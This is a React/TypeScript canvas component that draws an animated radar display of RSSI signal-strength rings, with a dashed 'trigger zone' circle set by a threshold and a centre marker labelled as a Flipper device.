function ProximityRadar({ rssiThreshold }: { rssiThreshold: number }) {
  const canvasRef = useRef<HTMLCanvasElement>(null)

  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return
    const ctx = canvas.getContext('2d')
    if (!ctx) return

    const w = canvas.width
    const h = canvas.height
    const cx = w / 2
    const cy = h / 2
    const maxR = Math.min(cx, cy) - 10

    ctx.clearRect(0, 0, w, h)

    // Background
    ctx.fillStyle = 'rgba(0,0,0,0.3)'
    ctx.fillRect(0, 0, w, h)

    // Concentric circles with RSSI labels
    const rssiLevels = [-30, -40, -50, -60, -70, -80, -90]
    for (const rssi of rssiLevels) {
      const ratio = (rssi - (-90)) / (-30 - (-90))
      const r = maxR * (1 - ratio)
      ctx.beginPath()
      ctx.arc(cx, cy, r, 0, Math.PI * 2)
      ctx.strokeStyle = 'rgba(234,179,8,0.12)'
      ctx.lineWidth = 1
      ctx.stroke()

      ctx.fillStyle = 'rgba(234,179,8,0.3)'
      ctx.font = '9px monospace'
      ctx.fillText(`${rssi}`, cx + r + 3, cy - 2)
    }

    // Trigger zone
    const triggerRatio = (rssiThreshold - (-90)) / (-30 - (-90))
    const triggerR = maxR * (1 - triggerRatio)

    ctx.beginPath()
    ctx.arc(cx, cy, triggerR, 0, Math.PI * 2)
    ctx.fillStyle = 'rgba(234,179,8,0.06)'
    ctx.fill()
    ctx.strokeStyle = 'rgba(234,179,8,0.5)'
    ctx.lineWidth = 2
    ctx.setLineDash([4, 4])
    ctx.stroke()
    ctx.setLineDash([])

    // "TRIGGER ZONE" label
    ctx.fillStyle = 'rgba(234,179,8,0.7)'
    ctx.font = 'bold 10px monospace'
    ctx.textAlign = 'center'
    ctx.fillText('TRIGGER ZONE', cx, cy + triggerR + 14)

    // Center dot (Flipper)
    ctx.beginPath()
    ctx.arc(cx, cy, 5, 0, Math.PI * 2)
    ctx.fillStyle = 'rgba(234,179,8,0.8)'
    ctx.fill()
    ctx.beginPath()
    ctx.arc(cx, cy, 8, 0, Math.PI * 2)
    ctx.strokeStyle = 'rgba(234,179,8,0.3)'
    ctx.lineWidth = 1
    ctx.stroke()

    // Crosshairs
    ctx.beginPath()
    ctx.moveTo(cx - maxR, cy)
    ctx.lineTo(cx + maxR, cy)
    ctx.moveTo(cx, cy - maxR)
    ctx.lineTo(cx, cy + maxR)
    ctx.strokeStyle = 'rgba(234,179,8,0.06)'
    ctx.lineWidth = 1
    ctx.stroke()

    // Sweep animation glow
    const now = Date.now()
    const angle = ((now % 3000) / 3000) * Math.PI * 2
    const grad = ctx.createConicGradient(angle, cx, cy)
    grad.addColorStop(0, 'rgba(234,179,8,0.15)')
    grad.addColorStop(0.1, 'rgba(234,179,8,0)')
    grad.addColorStop(1, 'rgba(234,179,8,0)')
    ctx.beginPath()
    ctx.arc(cx, cy, maxR, 0, Math.PI * 2)
    ctx.fillStyle = grad
    ctx.fill()

  }, [rssiThreshold])

  // Animate the sweep
  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return
    let raf: number
    const animate = () => {
      const ctx = canvas.getContext('2d')
      if (!ctx) return

      const w = canvas.width
      const h = canvas.height
      const cx = w / 2
      const cy = h / 2
      const maxR = Math.min(cx, cy) - 10

      ctx.clearRect(0, 0, w, h)
      ctx.fillStyle = 'rgba(0,0,0,0.3)'
      ctx.fillRect(0, 0, w, h)

      const rssiLevels = [-30, -40, -50, -60, -70, -80, -90]
      for (const rssi of rssiLevels) {
        const ratio = (rssi - (-90)) / (-30 - (-90))
        const r = maxR * (1 - ratio)
        ctx.beginPath()
        ctx.arc(cx, cy, r, 0, Math.PI * 2)
        ctx.strokeStyle = 'rgba(234,179,8,0.12)'
        ctx.lineWidth = 1
        ctx.stroke()
        ctx.fillStyle = 'rgba(234,179,8,0.3)'
        ctx.font = '9px monospace'
        ctx.textAlign = 'left'
        ctx.fillText(`${rssi}`, cx + r + 3, cy - 2)
      }

      // Trigger zone fill
      const triggerRatio = (rssiThreshold - (-90)) / (-30 - (-90))
      const triggerR = maxR * (1 - triggerRatio)
      ctx.beginPath()
      ctx.arc(cx, cy, triggerR, 0, Math.PI * 2)
      ctx.fillStyle = 'rgba(234,179,8,0.06)'
      ctx.fill()
      ctx.strokeStyle = 'rgba(234,179,8,0.5)'
      ctx.lineWidth = 2
      ctx.setLineDash([4, 4])
      ctx.stroke()
      ctx.setLineDash([])

      ctx.fillStyle = 'rgba(234,179,8,0.7)'
      ctx.font = 'bold 10px monospace'
      ctx.textAlign = 'center'
      ctx.fillText('TRIGGER ZONE', cx, cy + triggerR + 14)

      // Crosshairs
      ctx.beginPath()
      ctx.moveTo(cx - maxR, cy); ctx.lineTo(cx + maxR, cy)
      ctx.moveTo(cx, cy - maxR); ctx.lineTo(cx, cy + maxR)
      ctx.strokeStyle = 'rgba(234,179,8,0.06)'; ctx.lineWidth = 1; ctx.stroke()

      // Sweep
      const now = Date.now()
      const angle = ((now % 3000) / 3000) * Math.PI * 2
      ctx.save()
      ctx.beginPath()
      ctx.moveTo(cx, cy)
      ctx.arc(cx, cy, maxR, angle, angle + 0.5)
      ctx.closePath()
      const sweepGrad = ctx.createRadialGradient(cx, cy, 0, cx, cy, maxR)
      sweepGrad.addColorStop(0, 'rgba(234,179,8,0.25)')
      sweepGrad.addColorStop(1, 'rgba(234,179,8,0)')
      ctx.fillStyle = sweepGrad
      ctx.fill()
      ctx.restore()

      // Center
      ctx.beginPath()
      ctx.arc(cx, cy, 5, 0, Math.PI * 2)
      ctx.fillStyle = 'rgba(234,179,8,0.8)'; ctx.fill()
      ctx.beginPath()
      ctx.arc(cx, cy, 8, 0, Math.PI * 2)
      ctx.strokeStyle = 'rgba(234,179,8,0.3)'; ctx.lineWidth = 1; ctx.stroke()

      raf = requestAnimationFrame(animate)
    }
    raf = requestAnimationFrame(animate)
    return () => cancelAnimationFrame(raf)
  }, [rssiThreshold])

  return <canvas ref={canvasRef} width={300} height={300} className="rounded-xl border border-gold/10 mx-auto block" />
}

